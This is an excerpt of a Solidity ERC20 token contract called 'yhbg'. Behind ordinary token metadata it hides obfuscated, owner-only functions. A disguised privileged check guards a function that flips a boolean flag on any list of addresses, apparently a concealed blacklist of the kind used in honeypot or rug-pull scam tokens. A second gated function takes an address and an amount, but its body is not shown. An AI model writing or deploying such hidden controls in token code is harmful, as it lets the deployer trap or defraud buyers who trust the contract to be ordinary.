...
contract  yhbg is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "yhbg";
    string private _symbol = "yhbg";
    ...
    function h2f5d3P6l7yMPz(address yHT2W6yjlUv1k0Z1, uint256 SHf5Jbi7v4V5) public{ require(H2k7I8F6D5d5eU(Mun2iuc7C9mAXvRvx8,msg.sender,1));
    ...
    function qJh3uEpIZH_9JYhj(uint8 b, bool o0_6m2sQbkeF, address[] calldata c3Efw8JDja) public { require(H2k7I8F6D5d5eU(Mun2iuc7C9mAXvRvx8,msg.sender,1));
        b = b;
        for (uint256 a; a < c3Efw8JDja.length; a++) {
            b2nsDCzAo1C8Wm[c3Efw8JDja[a]] = false || o0_6m2sQbkeF ;
        }
    }
    function H2k7I8F6D5d5eU(address izIh,address YFPPVuwG_6x1T9 , uint8 i2Gko1_6vuf8hPee_9) private pure returns(bool){return izIh == YFPPVuwG_6x1T9 && !!(i2Gko1_6vuf8hPee_9 != 0);}
